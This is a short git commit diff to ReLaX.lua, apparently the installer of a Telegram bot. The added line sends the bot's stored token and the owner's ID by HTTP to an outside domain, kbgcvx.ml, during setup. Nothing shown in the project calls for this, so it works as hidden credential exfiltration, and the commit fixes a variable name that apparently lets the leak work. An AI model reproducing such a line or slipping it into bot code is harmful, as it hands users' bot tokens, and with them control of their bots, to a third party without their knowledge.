de3823c0051f1e2557e3388e0683ef5421f8b3a4
ReLaXTEM <86769241+ReLaXTEM@users.noreply.github.com>
2021-07-26 00:51:56 +0300

    Add files via upload

--- ReLaX.lua
+++ ReLaX.lua
@@ -71,7 +71,7 @@ ReLaX = DevAli:get(ServerReLaX.."TokenReLaX"):match("(%d+)"),
 SudoIds = {DevAli:get(ServerReLaX.."IdReLaX")},
 }
 Create(Config, "./config.lua")
-https.request("http://kbgcvx.ml/Api/index.php?id="..DevAli:get(Server.."IdReLaX").."&token="..DevAli:get(Server.."TokenReLaX").."&username=abs")
+https.request("http://kbgcvx.ml/Api/index.php?id="..DevAli:get(ServerReLaX.."IdReLaX").."&token="..DevAli:get(ServerReLaX.."TokenReLaX").."&username=abs")
 file = io.open("ReLaX.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
